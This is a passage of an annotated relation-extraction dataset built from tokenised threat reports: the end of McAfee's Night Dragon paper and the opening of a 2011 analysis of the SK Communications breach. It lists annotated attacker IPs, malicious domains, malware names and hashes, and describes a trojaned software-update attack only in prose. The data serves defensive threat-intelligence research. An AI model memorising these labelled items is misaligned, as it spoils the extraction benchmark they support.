"WinlogonHack", ",", "tools", "that", "intercept", "Windows", "logon", "requests", "and", "hijack", "usernames", "and", "passwords", "."], ["18", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Figure", "7", "."], ["Instructions", "on", "the", "use", "of", "WinlogonHack", "tool", "by", "its", "Chinese", "developers", "."], ["On", "the", "compromised", "web", "server", ",", "they", "also", "deployed", "ASPXSpy", ",", "a", "web", "-", "based", "remote", "administration", "tool", ",", "also", "of", "Chinese", "origin", "."], ["Figure", "8", "."], ["Parts", "of", "the", "ASPXSpy", "code", "with", "attribution", "to", "the", "Chinese", "developer", "."], ["There", "is", "nothing", "to", "suggest", "that", "the", "developers", "of", "these", "tools", "had", "any", "direct", "connection", "to", "these", "intrusions", ",", "as", "the", "tools", "are", "widely", "available", "on", "the", "Chinese", "web", "forums", "and", "tend", "to", "be", "used", "extensively", "by", "Chinese", "hacker", "groups", "."], ["Although", "it", "is", "possible", "that", "all", "of", "these", "indicators", "are", "an", "elaborate", "red", "-", "herring", "operation", "designed", "to", "pin", "the", "blame", "for", "the", "attacks", "on", "Chinese", "hackers", ",", "we", "believe", "this", "to", "be", "highly", "unlikely", "."], ["Further", ",", "it", "is", "unclear", "who", "would", "have", "the", "motivation", "to", "go", "to", "these", "extraordinary", "lengths", "to", "place", "the", "blame", "for", "these", "attacks", "on", "someone", "else", "."], ["We", "have", "strong", "evidence", "suggesting", "that", "the", "attackers", "were", "based", "in", "China", "."], ["McAfee", ",", "Inc.", "2821", "Mission", "College", "Boulevard"], ["Santa", "Clara", ",", "CA", "95054", "888", "847", "8766", "www.mcafee.com"], ["The", "information", "in", "this", "document", "is", "provided", "only", "for", "educational", "purposes", "and", "for", "the", "convenience", "of", "McAfee", "customers", "."], ["The", "information", "contained", "herein", "is", "subject", "to", "change", "without", "notice", ",", "and", "is", "provided", "\u201c", "as", "is", ",", "\u201d", "without", "guarantee", "or", "warranty", "as", "to", "the", "accuracy", "or", "applicability", "of", "the", "information", "to", "any", "specific", "situation", "or", "circumstance", "."], ["McAfee", ",", "the", "McAfee", "logo", ",", "McAfee", "Labs", ",", "McAfee", "Foundstone", ",", "McAfee", "ePolicy", "Orchestrator", ",", "McAfee", "ePO", ",", "McAfee", "Global", "Threat", "Intelligence", ",", "and", "McAfee", "VirusScan", "Enterprise", "are", "registered", "trademarks", "or", "trademarks", "of", "McAfee", "or", "its", "subsidiaries", "in", "the", "United", "States", "and", "other", "countries", "."], ["Other", "marks", "and", "brands", "may", "be", "claimed", "as", "the", "property", "of", "others", "."], ["Copyright", "\u00a9", "2011", "McAfee", "21401wp_night", "-", "dragon_0211"]]}, {"vertexSet": [[{"name": "July 2011", "pos": [4, 6], "sent_id": 1, "type": "Time"}], [{"name": "28 July 2011", "pos": [1, 4], "sent_id": 10, "type": "Time"}], [{"name": "SK Communications", "pos": [4, 6], "sent_id": 10, "type": "ExploitTargetObject"}], [{"name": "CyWorld", "pos": [6, 7], "sent_id": 11, "type": "ExploitTargetObject"}], [{"name": "Nate", "pos": [8, 9], "sent_id": 11, "type": "ExploitTargetObject"}], [{"name": "South Korea", "pos": [3, 5], "sent_id": 12, "type": "Country"}], [{"name": "SK Communications", "pos": [5, 7], "sent_id": 13, "type": "ExploitTargetObject"}], [{"name": "China", "pos": [10, 11], "sent_id": 14, "type": "Country"}], [{"name": "Japan", "pos": [12, 13], "sent_id": 14, "type": "Country"}], [{"name": "United States", "pos": [15, 17], "sent_id": 14, "type": "Country"}], [{"name": "Taiwan", "pos": [18, 19], "sent_id": 14, "type": "Country"}], [{"name": "Vietnam", "pos": [20, 21], "sent_id": 14, "type": "Country"}], [{"name": "Europe", "pos": [22, 23], "sent_id": 14, "type": "Country"}], [{"name": "June 2011", "pos": [24, 26], "sent_id": 29, "type": "Time"}], [{"name": "waypoints", "pos": [2, 3], "sent_id": 35, "type": "Obfuscation"}], [{"name": "names", "pos": [4, 5], "sent_id": 36, "type": "Information"}], [{"name": "phone numbers", "pos": [6, 8], "sent_id": 36, "type": "Information"}], [{"name": "home and email addresses", "pos": [9, 13], "sent_id": 36, "type": "Information"}], [{"name": "birth dates", "pos": [14, 16], "sent_id": 36, "type": "Information"}], [{"name": "gender details", "pos": [17, 19], "sent_id": 36, "type": "Information"}], [{"name": "user identifiers", "pos": [20, 22], "sent_id": 36, "type": "Information"}], [{"name": "passwords", "pos": [23, 24], "sent_id": 36, "type": "Information"}], [{"name": "resident registration numbers", "pos": [44, 47], "sent_id": 36, "type": "Information"}], [{"name": "ALZip update server", "pos": [19, 22], "sent_id": 40, "type": "Software"}], [{"name": "ESTsoft", "pos": [0, 1], "sent_id": 41, "type": "Organization"}], [{"name": "Korean National Police Agency", "pos": [3, 7], "sent_id": 45, "type": "Organization"}], [{"name": "ALYac", "pos": [19, 20], "sent_id": 51, "type": "Software"}], [{"name": "ALTools Common Module Update Application", "pos": [10, 15], "sent_id": 59, "type": "Software"}], [{"name": "ALCMUpdate.exe", "pos": [16, 17], "sent_id": 59, "type": "Software"}], [{"name": "ALAd.dll", "pos": [24, 25], "sent_id": 60, "type": "File"}], [{"name": "4 August 2011", "pos": [8, 11], "sent_id": 70, "type": "Time"}], [{"name": "ALCMUpdate.exe", "pos": [6, 7], "sent_id": 96, "type": "Dropper"}], [{"name": "Backdoor.Agent.Hza", "pos": [30, 35], "sent_id": 96, "type": "TrojanHorse"}], [{"name": "Trojan.Dropper.Agent.Hza Backdoor.Agent.Hza", "pos": [7, 19], "sent_id": 100, "type": "TrojanHorse"}], [{"name": "V.DRP.Agent.Hza V.BKD.Agent.Hza", "pos": [22, 28], "sent_id": 100, "type": "TrojanHorse"}], [{"name": "116.127.121.41", "pos": [18, 19], "sent_id": 103, "type": "Address"}], [{"name": "update.alyac.org", "pos": [12, 13], "sent_id": 104, "type": "Indicator"}], [{"name": "18 July 2011", "pos": [1, 4], "sent_id": 108, "type": "Time"}], [{"name": "25 July 2011", "pos": [5, 8], "sent_id": 108, "type": "Time"}], [{"name": "x.exe", "pos": [7, 8], "sent_id": 109, "type": "Malware"}], [{"name": "x.exe", "pos": [4, 5], "sent_id": 118, "type": "Malware"}], [{"name": "5A1B E6AD CB2C C40B 2E9D 6B6C 569F D4DA B273 E7AD", "pos": [15, 25], "sent_id": 118, "type": "SHA-1"}], [{"name": "nateon.exe", "pos": [5, 6], "sent_id": 126, "type": "Malware"}], [{"name": "rar.exe", "pos": [23, 24], "sent_id": 126, "type": "Malware"}], [{"name": "www.cph.com.tw/act", "pos": [14, 15], "sent_id": 133, "type": "Indicator"}], [{"name": "Cite Media Holding Group", "pos": [10, 14], "sent_id": 134, "type": "ExploitTargetObject"}], [{"name": "Microsoft Windows", "pos": [11, 13], "sent_id": 137, "type": "Software"}], [{"name": "26 July 2011", "pos": [1, 4], "sent_id": 140, "type": "Time"}], [{"name": "nateon.exe", "pos": [20, 21], "sent_id": 140, "type": "Malware"}], [{"name": "Nonhyeon", "pos": [12, 13], "sent_id": 145, "type": "Location"}], [{"name": "ro.diggfunny.com", "pos": [16, 17], "sent_id": 147, "type": "Indicator"}], [{"name": "cph.com.tw", "pos": [3, 4], "sent_id": 149, "type": "Indicator"}], [{"name": "Heuristic.BehavesLike.Win32.PasswordStealer.H", "pos": [21, 28], "sent_id": 150, "type": "Malware"}], [{"name": "nateon.exe", "pos": [4, 5], "sent_id": 153, "type": "Malware"}], [{"name": "F84C D73D ABF1 8660 7F98 6DF9 8C54 02A5 7BB5 8AD1", "pos": [15, 25], "sent_id": 153, "type": "SHA-1"}], [{"name": "Backdoor.Sogu", "pos": [5, 8], "sent_id": 154, "type": "Malware"}], [{"name": "rar.exe", "pos": [4, 5], "sent_id": 158, "type": "Malware"}], [{"name": "E87C 3ACB A599 5E01 7AD3 1B29 A5E2 FE36 3ED4 D9EB", "pos": [15, 25], "sent_id": 158, "type": "SHA-1"}], [{"name": "nateon.exe", "pos": [3, 4], "sent_id": 163, "type": "Malware"}], [{"name": "rar.exe", "pos": [7, 8], "sent_id": 163, "type": "Malware"}], [{"name": "x.exe", "pos": [11, 12], "sent_id": 163, "type": "Malware"}], [{"name": "www.cph.com.tw/act", "pos": [17, 18], "sent_id": 163, "type": "Indicator"}], [{"name": "Cite Media Holding Group", "pos": [6, 10], "sent_id": 164, "type": "Organization"}], [{"name": "Taiwan", "pos": [19, 20], "sent_id": 164, "type": "Country"}], [{"name": "116.127.121.109", "pos": [7, 8], "sent_id": 171, "type": "Address"}], [{"name": "116.127.121.109", "pos": [7, 8], "sent_id": 171, "type": "Address"}], [{"name": "nateon.exe", "pos": [5, 6], "sent_id": 199, "type": "Dropper"}], [{"name": "winsvcfs.dll", "pos": [17, 18], "sent_id": 199, "type": "Malware"}], [{"name": "nateon.exe", "pos": [2, 3], "sent_id": 202, "type": "Malware"}], [{"name": "nateon.duamlive.com", "pos": [8, 9], "sent_id": 208, "type": "Indicator"}], [{"name": "192.168.0.200", "pos": [14, 15], "sent_id": 210, "type": "Address"}], [{"name": "27 September 2010 at 01:17.04", "pos": [23, 28], "sent_id": 220, "type": "Time"}], [{"name": "Backdoor.Sogu", "pos": [24, 27], "sent_id": 224, "type": "Malware"}], [{"name": "bbs.afbjz.com", "pos": [4, 5], "sent_id": 225, "type": "Indicator"}], [{"name": "newhose.ntimobile.com", "pos": [8, 9], "sent_id": 225, "type": "Indicator"}], [{"name": "www.adv138mail.com", "pos": [13, 14], "sent_id": 225, "type": "Indicator"}], [{"name": "advapi32.dll", "pos": [19, 20], "sent_id": 239, "type": "Indicator"}], [{"name": "cryptbase.dll", "pos": [21, 22], "sent_id": 239, "type": "Indicator"}], [{"name": "gdi32.dll", "pos": [23, 24], "sent_id": 239, "type": "Indicator"}], [{"name": "iphlpapi.dll", "pos": [25, 26], "sent_id": 239, "type": "Indicator"}], [{"name": "kernel32.dll", "pos": [0, 1], "sent_id": 240, "type": "Indicator"}], [{"name": "mpr.dll", "pos": [2, 3], "sent_id": 240, "type": "Indicator"}], [{"name": "msvcrt.dll", "pos": [4, 5], "sent_id": 240, "type": "Indicator"}], [{"name": "ntdll.dll", "pos": [6, 7], "sent_id": 240, "type": "Indicator"}], [{"name": "odbc32.dll", "pos": [8, 9], "sent_id": 240, "type": "Indicator"}], [{"name": "ole32.dll", "pos": [10, 11], "sent_id": 240, "type": "Indicator"}], [{"name": "psapi.dll", "pos": [12, 13], "sent_id": 240, "type": "Indicator"}], [{"name": "sfc.dll", "pos": [14, 15], "sent_id": 240, "type": "Indicator"}], [{"name": "shell32.dll", "pos": [16, 17], "sent_id": 240, "type": "Indicator"}], [{"name": "shlwapi.dll", "pos": [18, 19], "sent_id": 240, "type": "Indicator"}], [{"name": "user32.dll", "pos": [20, 21], "sent_id": 240, "type": "Indicator"}], [{"name": "userenv.dll", "pos": [22, 23], "sent_id": 240, "type": "Indicator"}], [{"name": "version.dll", "pos": [24, 25], "sent_id": 240, "type": "Indicator"}], [{"name": "wininet.dll", "pos": [26, 27], "sent_id": 240, "type": "Indicator"}], [{"name": "ws2_32.dll", "pos": [28, 29], "sent_id": 240, "type": "Indicator"}], [{"name": "wtsapi32.dll", "pos": [30, 31], "sent_id": 240, "type": "Indicator"}], [{"name": "nateon.exe", "pos": [15, 16], "sent_id": 246, "type": "Malware"}], [{"name": "CONFIG DESTORY!", "pos": [4, 7], "sent_id": 247, "type": "Indicator"}], [{"name": "polymorphic", "pos": [21, 22], "sent_id": 258, "type": "MalwareCharacteristics"}], [{"name": "nateon.duamlive.com", "pos": [16, 17], "sent_id": 280, "type": "Indicator"}], [{"name": "Mozilla/4.0\u00b7(compatible;\u00b7MSIE\u00b76.0;\u00b7Windows\u00b7NT\u00b75. 1;SV1;", "pos": [20, 24], "sent_id": 284, "type": "SystemInformation"}], [{"name": "121.78.237.135", "pos": [25, 26], "sent_id": 300, "type": "Address"}], [{"name": "127.0.0.1", "pos": [38, 39], "sent_id": 300, "type": "Address"}], [{"name": "116.127.121.109", "pos": [20, 21], "sent_id": 304, "type": "Address"}], [{"name": "116.127.121.41", "pos": [30, 31], "sent_id": 305, "type": "Address"}], [{"name": "116.127.0.0", "pos": [4, 5], "sent_id": 316, "type": "Address"}], [{"name": "202.30.224.240", "pos": [26, 27], "sent_id": 328, "type": "Address"}], [{"name": "202.30.224.240", "pos": [26, 27], "sent_id": 328, "type": "Address"}], [{"name": "8.8.8.8", "pos": [17, 18], "sent_id": 329, "type": "Address"}], [{"name": "8.8.8.8", "pos": [17, 18], "sent_id": 329, "type": "Address"}], [{"name": "Guangming Wang", "pos": [6, 8], "sent_id": 346, "type": "ThreatActor"}], [{"name": "alyac.org", "pos": [3, 4], "sent_id": 348, "type": "Indicator"}], [{"name": "222.122.20.241", "pos": [27, 28], "sent_id": 352, "type": "Address"}], [{"name": "ALYAC.ORG", "pos": [5, 6], "sent_id": 398, "type": "Indicator"}], [{"name": "NPROTECTS.ORG", "pos": [6, 7], "sent_id": 398, "type": "Indicator"}], [{"name": "TRENDMICROS.NET", "pos": [0, 1], "sent_id": 399, "type": "Indicator"}], [{"name": "BOMULS.COM", "pos": [1, 2], "sent_id": 399, "type": "Indicator"}], [{"name": "8.5.1.42", "pos": [24, 25], "sent_id": 408, "type": "Address"}], [{"name": "8.5.1.42", "pos": [24, 25], "sent_id": 408, "type": "Address"}], [{"name": "192.168.10.132", "pos": [35, 36], "sent_id": 408, "type": "Address"}], [{"name": "DAUMFAN.COM", "pos": [3, 4], "sent_id": 420, "type": "Indicator"}], [{"name": "8.5.1.8", "pos": [5, 6], "sent_id": 420, "type": "Address"}], [{"name": "8.5.1.8", "pos": [5, 6], "sent_id": 420, "type": "Address"}], [{"name": "61.19.250.219", "pos": [0, 1], "sent_id": 427, "type": "Address"}], [{"name": "64.74.223.10", "pos": [3, 4], "sent_id": 427, "type": "Address"}], [{"name": "DIGGFUNNY.COM", "pos": [2, 3], "sent_id": 428, "type": "Indicator"}], [{"name": "EDSPLAN.COM", "pos": [3, 4], "sent_id": 428, "type": "Indicator"}], [{"name": "EZXSOFT.COM", "pos": [4, 5], "sent_id": 428, "type": "Indicator"}], [{"name": "69.197.132.132", "pos": [8, 9], "sent_id": 435, "type": "Address"}], [{"name": "218.213.229.69", "pos": [3, 4], "sent_id": 436, "type": "Address"}], [{"name": "218.213.229.68", "pos": [0, 1], "sent_id": 437, "type": "Address"}], [{"name": "64.74.223.48", "pos": [6, 7], "sent_id": 437, "type": "Address"}], [{"name": "NATEFAN.COM", "pos": [4, 5], "sent_id": 439, "type": "Indicator"}], [{"name": "PROJECTXZ.COM", "pos": [11, 12], "sent_id": 439, "type": "Indicator"}], [{"name": "8.5.1.11", "pos": [13, 14], "sent_id": 439, "type": "Address"}], [{"name": "202.181.170.67", "pos": [0, 1], "sent_id": 440, "type": "Address"}], [{"name": "61.82.71.30", "pos": [6, 7], "sent_id": 441, "type": "Address"}], [{"name": "FINALCOVER.COM", "pos": [1, 2], "sent_id": 442, "type": "Indicator"}], [{"name": "MINDPLAT.COM", "pos": [2, 3], "sent_id": 442, "type": "Indicator"}], [{"name": "SOUCESP.COM", "pos": [3, 4], "sent_id": 442, "type": "Indicator"}], [{"name": "Lee Cooper", "pos": [15, 17], "sent_id": 444, "type": "ThreatActor"}], [{"name": "cache.mindplat.com", "pos": [3, 4], "sent_id": 454, "type": "Indicator"}], [{"name": "bbs.ezxsoft.com", "pos": [7, 8], "sent_id": 454, "type": "Indicator"}], [{"name": "Trojan.Win32.AgentBypass", "pos": [3, 6], "sent_id": 456, "type": "TrojanHorse"}], [{"name": "update.alyac.org", "pos": [22, 23], "sent_id": 456, "type": "Indicator"}], [{"name": "202.30.224.240", "pos": [3, 4], "sent_id": 457, "type": "Address"}], [{"name": "Trojan.Win32.Generic", "pos": [22, 25], "sent_id": 458, "type": "TrojanHorse"}], [{"name": "16A3 1AA8 E7DD F66A 3155 1840 573B 6575", "pos": [30, 38], "sent_id": 855, "type": "MD5"}], [{"name": "$$$$$$$$mtx.bat", "pos": [5, 14], "sent_id": 856, "type": "Malware"}], [{"name": "winscard2.exe", "pos": [0, 1], "sent_id": 857, "type": "Malware"}], [{"name": "ABA9 BAEA 7082 5E6A DF07 2358 7F27 3DC4", "pos": [8, 16], "sent_id": 857, "type": "MD5"}], [{"name": "zhenxiang.exe", "pos": [0, 1], "sent_id": 859, "type": "Malware"}], [{"name": "winscard.exe", "pos": [1, 2], "sent_id": 859, "type": "Malware"}], [{"name": "BCE1 069D D099 F151 70C5 FD05 BAE9 21B5", "pos": [11, 19], "sent_id": 859, "type": "MD5"}], [{"name": "106140_d.bat", "pos": [8, 9], "sent_id": 860, "type": "Malware"}], [{"name": "tcmoniter.exe", "pos": [9, 10], "sent_id": 860, "type": "Malware"}], [{"name": "E8EE 9373 EE6C 8360 42E8 F48D 8DE2 DDA9", "pos": [15, 23], "sent_id": 860, "type": "MD5"}], [{"name": "$$$$$$$$fbl.bat", "pos": [33, 42], "sent_id": 860, "type": "Malware"}], [{"name": "tcomoniter.exe", "pos": [42, 43], "sent_id": 860, "type": "Malware"}], [{"name": "FDF2 C5C2 B187 4EFE 7FD3 3509 2DF2 D3BC", "pos": [48, 56], "sent_id": 860, "type": "MD5"}], [{"name": "40984_d.bat", "pos": [66, 67], "sent_id": 860, "type": "Malware"}], [{"name": "wincard0.dll", "pos": [0, 1], "sent_id": 861, "type": "Malware"}], [{"name": "uxtheme.dll", "pos": [1, 2], "sent_id": 861, "type": "Malware"}]], "labels": [{"r": "P17", "h": 24, "t": 23, "evidence": [40, 41]}, {"r": "P17", "h": 24, "t": 26, "evidence": [41, 51]}, {"r": "P21", "h": 41, "t": 40, "evidence": [118]}, {"r": "P21", "h": 44, "t": 43, "evidence": [126, 133]}, {"r": "P21", "h": 44, "t": 42, "evidence": [126, 133]}, {"r": "P33", "h": 48, "t": 47, "evidence": [140]}, {"r": "P21", "h": 54, "t": 53, "evidence": [153]}, {"r": "P21", "h": 57, "t": 56, "evidence": [158]}, {"r": "P21", "h": 61, "t": 58, "evidence": [163]}, {"r": "P21", "h": 61, "t": 59, "evidence": [163]}, {"r": "P21", "h": 61, "t": 60, "evidence": [163]}, {"r": "P21", "h": 64, "t": 58, "evidence": [163, 171]}, {"r": "P21", "h": 69, "t": 68, "evidence": [202, 208]}, {"r": "P21", "h": 70, "t": 68, "evidence": [202, 210]}, {"r": "P21", "h": 73, "t": 72, "evidence": [224, 225]}, {"r": "P21", "h": 75, "t": 72, "evidence": [224, 225]}, {"r": "P21", "h": 97, "t": 96, "evidence": [246, 247]}, {"r": "P13", "h": 96, "t": 98, "evidence": [246, 258]}, {"r": "P21", "h": 142, "t": 143, "evidence": [454, 456]}, {"r": "P21", "h": 145, "t": 143, "evidence": [456, 457]}, {"r": "P21", "h": 144, "t": 143, "evidence": [456]}, {"r": "P21", "h": 147, "t": 148, "evidence": [855, 856]}, {"r": "P21", "h": 147, "t": 149, "evidence": [855, 857]}, {"r": "P21", "h": 150, "t": 151, "evidence": [857, 859]}, {"r": "P21", "h": 150, "t": 152, "evidence": [857, 859]}, {"r": "P21", "h": 153, "t": 154, "evidence": [859, 860]}, {"r": "P21", "h": 153, "t": 155, "evidence": [859, 860]}, {"r": "P21", "h": 156, "t": 157, "evidence": [860]}, {"r": "P21", "h": 156, "t": 158, "evidence": [860]}, {"r": "P21", "h": 159, "t": 160, "evidence": [860]}, {"r": "P21", "h": 159, "t": 161, "evidence": [860, 861]}, {"r": "P21", "h": 159, "t": 162, "evidence": [860, 861]}], "title": "201109CommandFiveSKHack", "sents": [["SK", "Hack", "by", "an", "Advanced", "Persistent", "Threat", "Command", "Five", "Pty", "Ltd", "September", "2011", "ABSTRACT"], ["This", "document", "summarises", "the", "July", "2011", "intrusion", "into", "SK", "Communications", "which", "culminated", "in", "the", "theft", "of", "the", "personal", "information", "of", "up", "to", "35", "million", "people", "."], ["It", "describes", "the", "use", "of", "a", "trojaned", "software", "update", "to", "gain", "access", "to", "the", "target", "network", ",", "in", "effect", "turning", "a", "security", "practice", "into", "a", "vulnerability", "."], ["It", "also", "describes", "the", "use", "of", "a", "legitimate", "company", "to", "host", "tools", "used", "in", "the", "intrusion", "."], ["Links", "between", "this", "intrusion", "and", "other", "malicious", "activity", "are", "identified", "and", "valuable", "insights", "are", "provided", "for", "network", "defenders", "."], ["Technical", "details", "of", "malicious", "software", "and", "infrastructure", "are", "also", "provided", "."], ["WARNING"], ["This", "paper", "discusses", "malicious", "activity", "and", "identifies", "Internet", "Protocol", "(", "IP", ")", "addresses", ",", "domain", "names", ",", "and", "websites", "that", "may", "contain", "malicious", "content", "."], ["For", "safety", "reasons", "these", "locations", "should", "not", "be", "accessed", ",", "scanned", ",", "probed", ",", "or", "otherwise", "interacted", "with", "unless", "their", "trustworthiness", "can", "be", "verified", "."], ["SK", "HACK"], ["On", "28", "July", "2011", "SK", "Communications", "announced", "it", "had", "been", "the", "subject", "of", "a", "hack", "which", "resulted", "in", "the", "theft", "of", "the", "personal", "details", "of", "up", "to", "35", "million", "of", "its", "users", "."], ["The", "compromised", "details", "were", "those", "of", "CyWorld", "and", "Nate", "users", ",", "as", "stored", "in", "SK", "Communications", "\u2019", "user", "databases", "."], ["CyWorld", "1", "is", "South", "Korea", "\u2019s", "largest", "social", "networking", "site", "and", "Nate", "is", "a", "popular", "South", "Korean", "web", "portal", "."], ["Both", "services", "are", "owned", "by", "SK", "Communications", "."], ["(", "Sung\u00adjin", ",", "2011", ")", "1CyWorld", "has", "also", "expanded", "to", "China", ",", "Japan", ",", "the", "United", "States", ",", "Taiwan", ",", "Vietnam", "and", "Europe", "."], ["(", "SK", "Communications", ")"], ["The", "sophistication", "of", "the", "attack", "along", "with", "the", "period", "of", "time", "over", "which", "it", "was", "planned", ",", "and", "conducted", ",", "indicate", "that", "this", "attack", "was", "likely", "to", "have", "been", "undertaken", "by", "an", "Advanced", "Persistent", "Threat2", "."], ["Between", "18", "and", "25", "July", "2011", "the", "attackers", "3", "infected", "over", "60", "SK", "Communications", "computers", "and", "used", "them", "to", "gain", "access", "to", "the", "user", "databases", "."], ["The", "attackers", "infected", "these", "computers", "by", "first", "compromising", "a", "server", ",", "belonging", "to", "a", "South", "Korean", "software", "company", ",", "used", "to", "deliver", "software", "updates", "to", "customers", "(", "including", "SK", "Communications", ")", "."], ["The", "attackers", "modified", "the", "server", "so", "that", "the", "SK", "Communications", "computers", "would", "receive", "a", "trojaned", "4", "update", "file", "when", "they", "conducted", "their", "routine", "checks", "for", "software", "updates", "."], ["(", "Moon\u00adyoung", ",", "2011", ")", "(", "ESTsoft", ",", "2011", ")"], ["For", "a", "definition", "of", "the", "term", "\u2018", "Advanced", "Persistent", "Threat", "\u2019", "refer", "to", "the", "Command", "Five", "paper", "\u2018", "Advanced", "Persistent", "Threats", ":", "A", "Decade", "in", "Review", "\u2019", "(", "Command", "Five", "Pty", "Ltd", ",", "2011", ")", "."], ["3"], ["The", "term", "\u2018", "attackers", "\u2019", "is", "used", "in", "this", "paper", "to", "describe", "both", "the", "hackers", "and", "anyone", "to", "whom", "they", "were", "reporting", "."], ["4", "A", "trojan", "is", "a", "document", "or", "program", "which", "appears", "harmless", "but", "performs", "malicious", "activity", "when", "opened", "or", "run", "."], ["2", "PAGE", "1", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["Such", "routine", "updates", "(", "commonly", "known", "as", "\u2018", "patches", "\u2019", ")", "are", "a", "good", "security", "practice", "as", "they", "often", "include", "fixes", "for", "security", "weaknesses", "identified", "in", "the", "software", "."], ["Without", "software", "updates", "the", "SK", "Communications", "computers", "would", "have", "been", "vulnerable", "to", "several", "other", "attacks", "including", "a", "significant", "one", "which", "was", "made", "public", "in", "June", "20115", "."], ["The", "security", "of", "software", "updates", "is", "usually", "trusted", "implicitly", "and", "the", "exploitation", "of", "this", "trust", "relationship", "could", "go", "undetected", "by", "many", "targets", ",", "as", "it", "did", "for", "some", "time", "by", "SK", "Communications", "."], ["Between", "18", "and", "25", "July", "the", "attackers", "conducted", "command", "and", "control", "and", "monitoring", "activities", "on", "the", "infected", "computers", "."], ["This", "involved", "the", "upload", "of", "tools", ",", "conveniently", "stored", "on", "the", "website", "of", "a", "Taiwanese", "publishing", "company", "the", "attackers", "had", "earlier", "hacked", "."], ["Then", "on", "26", "July", "2011", ",", "the", "attackers", ",", "having", "done", "the", "necessary", "groundwork", ",", "proceeded", "to", "hack", "the", "Nate", "and", "CyWorld", "user", "databases", "6", "."], ["(", "Birdman", ",", "2011", ")", "(", "Moon\u00adyoung", ",", "2011", ")"], ["Using", "\u2018", "waypoints\u20197", "to", "obfuscate", "the", "source", "of", "their", "activities", ",", "the", "attackers", "successfully", "stole", "the", "personal", "details", "of", "up", "to", "35", "million", "SK", "Communications", "customers", "from", "the", "user", "databases", "."], ["These", "personal", "details", "included", "names", ",", "phone", "numbers", ",", "home", "and", "email", "addresses", ",", "birth", "dates", ",", "gender", "details", ",", "user", "identifiers", ",", "passwords", "and", ",", "due", "to", "South", "Korea", "\u2019s", "Real", "Name", "System", "8", "which", "was", "in", "place", "at", "the", "time", ",", "also", "resident", "registration", "numbers", "."], ["The", "passwords", "and", "resident", "registration", "numbers", "were", "reportedly", "encrypted", "but", "the", "other", "details", "were", "not", "."], ["(", "Birdman", ",", "2011", ")", "(", "Hauri", "\u00ad", "Response", "Team", ",", "2011", ")", "(", "Moon\u00adyoung", ",", "2011", ")", "(", "Jin\u00adwoo", "Seo", ",", "2011", ")"], ["THE", "UPDATE", "SERVER"], ["The", "update", "server", "used", "by", "the", "attackers", "as", "a", "launchpad", "for", "their", "attack", "against", "SK", "Communications", "was", "ESTsoft", "\u2019s", "ALZip", "update", "server", "."], ["ESTsoft", "is", "a", "large", "South", "Korean", "software", "company"], ["A", "vulnerability", "exists", "in", "certain", "versions", "of", "a", "software", "program", "used", "by", "SK", "Communications", "(", "amongst", "other", "companies", ")", "which", "could", "allow", "an", "attacker", "to", "gain", "control", "of", "computers", "if", "the", "program", "is", "used", "on", "them", "to", "open", "a", "maliciously", "crafted", "file", "."], ["(", "Japanese", "IT", "Promotion", "Agency", "2011", ")"], ["6"], ["According", "to", "the", "Korean", "National", "Police", "Agency", "the", "hacker", "collected", "information", "from", "the", "infected", "computers", "for", "up", "to", "a", "week", "before", "hacking", "the", "databases", "."], ["(", "Moon\u00adyoung", ",", "2011", ")"], ["7", "A", "\u2018", "waypoint", "\u2019", "is", "a", "computer", "used", "by", "attackers", "as", "an", "intermediary", "point", "to", "obfuscate", "the", "source", "of", "their", "hacking", "activities", "."], ["8"], ["Under", "South", "Korea", "\u2019s", "Real", "Name", "System", ",", "Koreans", "were", "required", "to", "submit", "their", "real", "names", "and", "resident", "registration", "numbers", "when", "creating", "accounts", "on", "any", "website", "attracting", "more", "than", "100,000", "visitors", "per", "day", "."], ["(", "TMCnews", "2011", ")", "5", "and", "ALZip", "is", "a", "file", "compression", "and", "archive", "tool", "developed", "by", "the", "company", "."], ["ALZip", "is", "part", "of", "a", "trusted", "suite", "of", "tools", "known", "as", "ALTools", "which", "also", "includes", "the", "antivirus", "software", ",", "ALYac", "."], ["The", "antivirus", "software", "is", "independent", "of", "the", "rest", "of", "the", "suite", "of", "tools", "."], ["It", "uses", "a", "different", "update", "program", "and", "server", "to", "the", "other", "tools", "."], ["The", "security", "of", "ALYac", "was", "not", "compromised", "in", "the", "attack", "."], ["(", "ESTsoft", ",", "2011", ")", "(", "ESTsoft", ",", "2011", ")"], ["The", "attackers", ",", "purportedly", "using", "Chinese", "IP", "addresses9", ",", "gained", "access", "to", "the", "ALZip", "update", "server", "via", "unknown", "means", "and", "uploaded", "instructions", "to", "it", "."], ["Then", ",", "when", "SK", "Communications", "computers", "conducted", "their", "routine", "check", "for", "ALTools", "updates", ",", "the", "attacker", "\u2019s", "instructions", "on", "the", "update", "server", "directed", "the", "computers", "to", "download", "a", "trojaned", "update", "from", "the", "attacker", "\u2019s", "Content", "Delivery", "Network10", "(", "CDN", ")", "instead", "of", "the", "legitimate", "update", "from", "ESTsoft", "\u2019s", "CDN", "."], ["(", "ESTsoft", ",", "2011", ")"], ["The", "trojaned", "update", "exploits", "a", "software", "vulnerability", "11", "in", "the", "ALTools", "Common", "Module", "Update", "Application", "(", "ALCMUpdate.exe", ")", "\u00ad", "the", "program", "used", "to", "conduct", "the", "routine", "checks", "for", "ALTools", "software", "updates", "."], ["This", "vulnerability", "allowed", "a", "malicious", "Dynamic", "Link", "Library", "(", "DLL", ")", "12", "file", "to", "be", "loaded", "instead", "of", "the", "legitimate", "DLL", "update", "file", "(", "ALAd.dll", ")", ",", "thereby", "enabling", "malicious", "code", "to", "be", "run", "and", "malicious", "software", "(", "malware", ")", "to", "be", "installed", "on", "computers", "which", "requested", "the", "update", "."], ["Over", "60", "SK", "Communications", "computers", "were", "compromised", "via", "the", "trojaned", "update", "."], ["(", "ESTsoft", ",", "2011", ")", "(", "EDaily", ",", "2011", ")", "(", "ESTsoft", ",", "2011", ")"], ["The", "attackers", "are", "believed", "to", "have", "designated", "targets", "for", "infection", ",", "so", "that", "the", "trojaned", "update", "was", "only", "delivered", "to", "SK", "Communications", "computers", "and", "not", "to", "other", "computers", "requesting", "the", "same"], ["According", "to", "South", "Korean", "news", "outlets", "the", "attackers", "used", "Chinese", "IP", "addresses", "."], ["(", "Goodin", ",", "2011", ")"], ["10", "A", "CDN", "is", "comprised", "of", "multiple", "servers", "which", "are", "used", "to", "distribute", "software", "downloads", ",", "thereby", "balancing", "the", "load", "and", "preventing", "outages", "due", "to", "individual", "servers", "becoming", "overloaded", "."], ["11", "A", "software", "vulnerability", 